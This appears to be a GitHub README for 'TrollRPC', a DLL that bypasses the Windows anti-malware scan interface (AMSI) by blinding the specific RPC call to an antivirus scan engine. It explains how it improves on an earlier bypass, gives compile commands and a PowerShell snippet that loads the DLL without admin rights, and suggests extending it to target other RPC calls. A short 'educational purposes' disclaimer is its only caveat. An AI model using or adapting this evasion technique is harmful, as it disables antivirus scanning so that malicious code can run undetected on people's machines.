# TrollRPC

https://github.com/andreisss/Ghosting-AMSI released a amsi bypass by breaking NdrClientCall3 which means every subsequent RPC call (eg. some name resolution uses RPC thats why web requests to github fail) breaks which kind of makes the technique obsolete. This particular dll will only break the specific RPC call to the AV scan engine, allowing all other RPC calls through. This means you can bypass amsi for both powershell/clr and then continue running commands that require RPC (everything lol). 

Currently it blinds a specific RPC call to a specific AV engine ;)  For anything else you gotta tweak to your liking - depending on the architecture of the product, whether or not it makes rpc call to engine for verification.

## Compilation instructions
```
#Use Visual Studio Command Prompt
ml64 /c /nologo /Fo AsmStub.obj AsmStub.asm
cl /LD /O2 /MD /DNDEBUG /Zl /GS- /Gy /GF TrollRPC.cpp AsmStub.obj /link kernel32.lib user32.lib msvcrt.lib /OPT:REF /OPT:ICF /DEBUG:NONE /PDB:NONE

Alternatively, you can use the compiled dll
```
## General Usage 
Just load the DLL into your desired process

## .powershell Usage (does not require admin)
```
Add-Type -MemberDefinition @"
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibrary(string lpFileName);
"@ -Namespace Win32 -Name NativeMethods

[Win32.NativeMethods]::LoadLibrary("C:\TrollRPC.dll")
```

## Disclaimer
Should only be used for educational purposes!

## Upgrades
You can try doing it in c# and making it dynamically take in specific arguments to blind chosen RPC calls (now its hardcoded).







